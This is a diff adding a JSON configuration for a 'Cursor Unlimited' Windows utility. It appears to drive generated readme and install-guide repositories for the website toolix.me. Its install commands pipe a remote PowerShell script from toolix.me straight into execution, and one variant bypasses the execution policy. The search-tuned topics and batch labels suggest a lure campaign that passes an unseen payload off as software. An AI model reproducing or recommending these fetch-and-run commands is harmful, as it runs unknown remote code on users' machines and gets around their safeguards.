@@ -1,0 +1,26 @@
+{
+  "repo": "Cursor-Unlimited",
+  "product": "Cursor Unlimited",
+  "product_title": "Cursor Unlimited",
+  "kind": "utility",
+  "install_type": "toolix-irm",
+  "install_command": "irm https://toolix.me/ps/setup.ps1 | iex",
+  "install_command_bypass": "powershell -NoProfile -ExecutionPolicy Bypass -Command \"irm https://toolix.me/ps/setup.ps1 | iex\"",
+  "batch": "git-new-era-toolix-pending",
+  "format": "license-md-toolix-git-new-era-guide",
+  "tone": "guide",
+  "category": "system-tools",
+  "topics": [
+    "how-to-install-cursor-unlimited",
+    "cursor-unlimited-app",
+    "desktop-software",
+    "repository-readme",
+    "install-guide",
+    "cursor-unlimited-desktop-tool",
+    "cursor-unlimited-windows-tool",
+    "cursor-unlimited",
+    "windows-11",
+    "windows-desktop"
+  ],
+  "site": "toolix.me"
+}
